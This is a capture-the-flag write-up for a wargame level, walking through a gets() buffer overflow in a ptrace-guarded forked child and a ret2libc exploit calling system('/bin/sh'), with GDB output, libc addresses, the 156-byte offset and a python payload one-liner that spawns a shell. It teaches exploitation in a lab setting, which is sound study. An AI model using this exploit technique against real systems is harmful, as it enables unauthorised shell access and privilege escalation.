
# Level04 - Exploiting a Buffer Overflow with Ret2libc

## Step 1: Running the Program

First, let's run the program to observe its behavior:

```bash
$ ./level04
Give me some shellcode, k
coucou
child is exiting...
```

The program asks for input and then exits.

## Step 2: Analyzing with GDB

To understand the program, let's analyze it using GDB (GNU Debugger). The program performs a `fork()`, and the child process reads input using `gets()`. The parent process uses `ptrace` to monitor the child, checking if it calls the `exec` function.

```assembly
0x080487f6 <+302>: mov    DWORD PTR [esp],0x8048931
0x080487fd <+309>: call   0x8048500 <puts@plt>
```

If `exec()` is called, the program outputs `"no exec() for you"`.

## Step 3: Exploiting the Buffer Overflow

We can overflow the `gets()` buffer in the child process. Use a long input string to find the offset to control EIP (Instruction Pointer).

```bash
$ gdb -q ./level04
(gdb) set follow-fork-mode child
(gdb) r
Starting program: /home/users/level04/level04
Give me some shellcode, k
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

The program segfaults, indicating control of EIP.

### Finding the Offset

```bash
(gdb) r
Program received signal SIGSEGV, Segmentation fault.
[Switching to process 2283]
0x41326641 in ?? ()
```
We need to determine the offset at which the buffer overflows with the help of https://wiremask.eu/tools/buffer-overflow-pattern-generator/?:
We find that EIP is overwritten at offset `156`.

## Step 4: Ret2libc Attack

We will use a Ret2libc attack by calling `system("/bin/sh")`. We need the addresses of `system()`, `exit()`, and the string `"/bin/sh"`.

### Finding Required Addresses

1. **`system` Address**:
   ```bash
   (gdb) info function system
   0xf7e6aed0  system
   ```

2. **`exit` Address**:
   ```bash
   (gdb) info function exit
   0xf7e5eb70  exit
   ```

3. **`/bin/sh` String**:
   ```bash
   (gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
   0xf7f897ec
   ```

### Building the Payload

Construct the payload with the addresses found:

```bash
("B" * 156) + system + exit + "/bin/sh"
```

### Executing the Exploit

Save the payload to a file and run the program:

```bash
$ python -c 'print "B"*156+"Ð®æ÷"+"pëå÷"+"ìø÷"' > /tmp/payload
$ cat /tmp/payload - | ./level04
Give me some shellcode, k
whoami
level05
```

## Summary

- The program is vulnerable to a buffer overflow via `gets()`.
- Using the overflow, we performed a Ret2libc attack to call `system("/bin/sh")`.
- This allowed us to bypass security checks and gain shell access.

This exercise demonstrates a common technique for exploiting buffer overflows when direct execution is restricted.
